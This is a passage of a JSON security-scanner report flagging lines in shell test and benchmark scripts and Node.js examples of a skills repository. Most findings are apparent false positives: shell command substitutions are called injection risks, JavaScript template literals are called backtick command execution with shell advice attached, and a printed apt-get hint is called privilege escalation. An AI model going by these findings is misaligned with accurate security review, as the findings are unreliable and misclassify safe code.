        "line_number": 220,
        "issue": "Command substitution in shell",
        "evidence": "local min=$(echo \"$results\" | jq -r '.min_ms')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 221,
        "issue": "Command substitution in shell",
        "evidence": "local max=$(echo \"$results\" | jq -r '.max_ms')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 222,
        "issue": "Command substitution in shell",
        "evidence": "local stddev=$(echo \"$results\" | jq -r '.stddev_ms')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 223,
        "issue": "Command substitution in shell",
        "evidence": "local iterations=$(echo \"$results\" | jq -r '.iterations')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 246,
        "issue": "Command substitution in shell",
        "evidence": "local results1=$(benchmark_query \"$query1\" \"$ITERATIONS\" \"$WARMUP_RUNS\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 249,
        "issue": "Command substitution in shell",
        "evidence": "local results2=$(benchmark_query \"$query2\" \"$ITERATIONS\" \"$WARMUP_RUNS\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 251,
        "issue": "Command substitution in shell",
        "evidence": "local mean1=$(echo \"$results1\" | jq -r '.mean_ms')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 252,
        "issue": "Command substitution in shell",
        "evidence": "local mean2=$(echo \"$results2\" | jq -r '.mean_ms')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 254,
        "issue": "Command substitution in shell",
        "evidence": "local improvement=$(echo \"scale=2; (($mean1 - $mean2) / $mean1) * 100\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 255,
        "issue": "Command substitution in shell",
        "evidence": "local speedup=$(echo \"scale=2; $mean1 / $mean2\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 278,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$mean2 < $mean1\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 280,
        "issue": "Command substitution in shell",
        "evidence": "elif (( $(echo \"$mean2 > $mean1\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 294,
        "issue": "Privilege escalation",
        "evidence": "echo \"  Ubuntu/Debian: sudo apt-get install jq\" >&2",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 302,
        "issue": "Command substitution in shell",
        "evidence": "query1=$(cat \"$COMPARE_FILE1\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 303,
        "issue": "Command substitution in shell",
        "evidence": "query2=$(cat \"$COMPARE_FILE2\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 307,
        "issue": "Command substitution in shell",
        "evidence": "results=$(benchmark_query \"$QUERY\" \"$ITERATIONS\" \"$WARMUP_RUNS\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 311,
        "issue": "Command substitution in shell",
        "evidence": "query=$(cat \"$QUERY_FILE\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 312,
        "issue": "Command substitution in shell",
        "evidence": "results=$(benchmark_query \"$query\" \"$ITERATIONS\" \"$WARMUP_RUNS\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
        "line_number": 313,
        "issue": "Command substitution in shell",
        "evidence": "format_output \"$results\" \"$(basename \"$QUERY_FILE\")\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 88,
        "issue": "Command substitution in shell",
        "evidence": "for i in $(seq 1 \"$NODES\"); do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 108,
        "issue": "Command substitution in shell",
        "evidence": "for i in $(seq 1 \"$NODES\"); do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 109,
        "issue": "Unencrypted HTTP",
        "evidence": "initial_cluster=\"${initial_cluster}etcd-node$i=http://etcd-node$i:2380,\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 114,
        "issue": "Command substitution in shell",
        "evidence": "for i in $(seq 1 \"$NODES\"); do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 120,
        "issue": "Command substitution in shell",
        "evidence": "-p \"$((2378 + i)):2379\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 121,
        "issue": "Command substitution in shell",
        "evidence": "-p \"$((2478 + i)):2380\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 125,
        "issue": "Unencrypted HTTP",
        "evidence": "--initial-advertise-peer-urls \"http://etcd-node$i:2380\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 126,
        "issue": "Unencrypted HTTP",
        "evidence": "--listen-peer-urls \"http://0.0.0.0:2380\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 127,
        "issue": "Unencrypted HTTP",
        "evidence": "--listen-client-urls \"http://0.0.0.0:2379\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 128,
        "issue": "Unencrypted HTTP",
        "evidence": "--advertise-client-urls \"http://etcd-node$i:2379\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 141,
        "issue": "Command substitution in shell",
        "evidence": "for attempt in $(seq 1 30); do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 163,
        "issue": "Command substitution in shell",
        "evidence": "local value=$(docker exec etcd-node1 etcdctl get test-key --print-value-only)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 173,
        "issue": "Command substitution in shell",
        "evidence": "local value2=$(docker exec etcd-node2 etcdctl get test-key --print-value-only)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 183,
        "issue": "Command substitution in shell",
        "evidence": "local lease_id=$(docker exec etcd-node1 etcdctl lease grant 10 | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 185,
        "issue": "Command substitution in shell",
        "evidence": "local temp_value=$(docker exec etcd-node1 etcdctl get temp-key --print-value-only)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 206,
        "issue": "Command substitution in shell",
        "evidence": "local counter=$(docker exec etcd-node1 etcdctl get counter --print-value-only)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 219,
        "issue": "Command substitution in shell",
        "evidence": "for i in $(seq 1 \"$NODES\"); do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 220,
        "issue": "Command substitution in shell",
        "evidence": "local status=$(docker exec \"etcd-node$i\" etcdctl endpoint status --cluster -w json 2>/dev/null || echo \"[]\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 223,
        "issue": "Command substitution in shell",
        "evidence": "local is_leader=$(echo \"$status\" | jq -r \".[0].Status.leader == .[0].Status.header.member_id\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 232,
        "issue": "Command substitution in shell",
        "evidence": "\"endpoint\": \"http://localhost:$((2378 + i))\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 248,
        "issue": "Command substitution in shell",
        "evidence": "$(IFS=,; echo \"${nodes_status[*]}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 265,
        "issue": "Command substitution in shell",
        "evidence": "for i in $(seq 1 \"$NODES\"); do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/test_etcd_cluster.sh",
        "line_number": 266,
        "issue": "Command substitution in shell",
        "evidence": "log_info \"  Node $i: http://localhost:$((2378 + i))\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 125,
        "issue": "Command substitution in shell",
        "evidence": "count=$((count + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 126,
        "issue": "Command substitution in shell",
        "evidence": "local basename=$(basename \"$workflow\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 129,
        "issue": "Command substitution in shell",
        "evidence": "local name=$(grep -E \"^name:\" \"$workflow\" | head -1 | sed 's/name: *//' | tr -d '\"' | tr -d \"'\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 139,
        "issue": "Command substitution in shell",
        "evidence": "local triggers=$(awk '/^on:/{flag=1;next}/^[a-zA-Z]/{flag=0}flag' \"$workflow\" | grep -v \"^$\" | sed 's/^  //' | tr '\\n' ', ' | sed 's/, $//')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 145,
        "issue": "Command substitution in shell",
        "evidence": "local job_count=$(grep -E \"^  [a-z][a-z_-]+:\" \"$workflow\" | wc -l | tr -d ' ')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 195,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 197,
        "issue": "Command substitution in shell",
        "evidence": "echo -e \"${BLUE}Testing workflow: $(basename \"$workflow_path\")${NC}\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 240,
        "issue": "Command substitution in shell",
        "evidence": "local output_file=$(mktemp)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 248,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 249,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$((end_time - start_time))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 258,
        "issue": "Command substitution in shell",
        "evidence": "local job_count=$(grep -c \"Job succeeded\" \"$output_file\" || echo \"0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 259,
        "issue": "Command substitution in shell",
        "evidence": "local failed_jobs=$(grep -c \"Job failed\" \"$output_file\" || echo \"0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 294,
        "issue": "Command substitution in shell",
        "evidence": "local workflow_name=$(basename \"$workflow_path\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 307,
        "issue": "Command substitution in shell",
        "evidence": "\"timestamp\": \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/collaboration/github/github-actions-workflows/resources/scripts/test_actions.sh",
        "line_number": 389,
        "issue": "Command substitution in shell",
        "evidence": "if ! workflow_path=$(validate_workflow \"$WORKFLOW\"); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 36,
        "issue": "Command substitution in shell",
        "evidence": "Usage: $(basename \"$0\") [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 50,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 53,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost --concurrency 100 --threads 4",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 56,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost --duration 30 --json",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 59,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost --test-workers",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 62,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost --test-cache",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 140,
        "issue": "Command substitution in shell",
        "evidence": "wrk_output=$(wrk -t\"$threads\" -c\"$connections\" -d\"${duration}s\" --latency \"$url\" 2>&1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 154,
        "issue": "Command substitution in shell",
        "evidence": "requests_per_sec=$(echo \"$wrk_output\" | grep \"Requests/sec:\" | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 155,
        "issue": "Command substitution in shell",
        "evidence": "total_requests=$(echo \"$wrk_output\" | grep \"requests in\" | awk '{print $1}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 156,
        "issue": "Command substitution in shell",
        "evidence": "total_data=$(echo \"$wrk_output\" | grep \"requests in\" | awk '{print $5}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 157,
        "issue": "Command substitution in shell",
        "evidence": "avg_latency=$(echo \"$wrk_output\" | grep \"Latency\" | head -1 | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 158,
        "issue": "Command substitution in shell",
        "evidence": "max_latency=$(echo \"$wrk_output\" | grep \"Latency\" | head -1 | awk '{print $4}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 159,
        "issue": "Command substitution in shell",
        "evidence": "stdev_latency=$(echo \"$wrk_output\" | grep \"Latency\" | head -1 | awk '{print $3}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 162,
        "issue": "Command substitution in shell",
        "evidence": "latency_50=$(echo \"$wrk_output\" | grep \"50.000%\" | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 163,
        "issue": "Command substitution in shell",
        "evidence": "latency_75=$(echo \"$wrk_output\" | grep \"75.000%\" | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 164,
        "issue": "Command substitution in shell",
        "evidence": "latency_90=$(echo \"$wrk_output\" | grep \"90.000%\" | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 165,
        "issue": "Command substitution in shell",
        "evidence": "latency_99=$(echo \"$wrk_output\" | grep \"99.000%\" | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 230,
        "issue": "Command substitution in shell",
        "evidence": "rps=$(cat /tmp/wrk_rps.tmp)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 256,
        "issue": "Command substitution in shell",
        "evidence": "miss_rps=$(cat /tmp/wrk_rps.tmp 2>/dev/null || echo \"0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 264,
        "issue": "Command substitution in shell",
        "evidence": "hit_rps=$(cat /tmp/wrk_rps.tmp 2>/dev/null || echo \"0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 274,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$hit_rps > $miss_rps\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 276,
        "issue": "Command substitution in shell",
        "evidence": "improvement=$(echo \"scale=2; (($hit_rps - $miss_rps) / $miss_rps) * 100\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 319,
        "issue": "Command substitution in shell",
        "evidence": "rps=$(cat /tmp/wrk_rps.tmp)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 321,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$rps < 100\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/proxies/nginx-configuration/resources/scripts/test_performance.sh",
        "line_number": 327,
        "issue": "Command substitution in shell",
        "evidence": "elif (( $(echo \"$rps < 1000\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
        "line_number": 92,
        "issue": "Backtick command execution",
        "evidence": "`rate_limit:${key}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
        "line_number": 133,
        "issue": "Backtick command execution",
        "evidence": "return `api_key:${apiKey}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
        "line_number": 138,
        "issue": "Backtick command execution",
        "evidence": "return `user:${req.user.id}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
        "line_number": 143,
        "issue": "Backtick command execution",
        "evidence": "return `ip:${ip}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
        "line_number": 179,
        "issue": "Backtick command execution",
        "evidence": "message: `Too many requests. Please retry after ${retryAfter} seconds.`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
        "line_number": 216,
        "issue": "Backtick command execution",
        "evidence": "keyGenerator: (req) => `user:${req.user?.id || 'anonymous'}`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 31,
        "issue": "Backtick command execution",
        "evidence": "req.id = `req-${Date.now()}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 187,
        "issue": "Backtick command execution",
        "evidence": "const baseUrl = `${req.protocol}://${req.get('host')}${req.path}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 188,
        "issue": "Backtick command execution",
        "evidence": "let queryParams = `limit=${limit}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 189,
        "issue": "Backtick command execution",
        "evidence": "if (status) queryParams += `&status=${status}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 190,
        "issue": "Backtick command execution",
        "evidence": "if (role) queryParams += `&role=${role}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
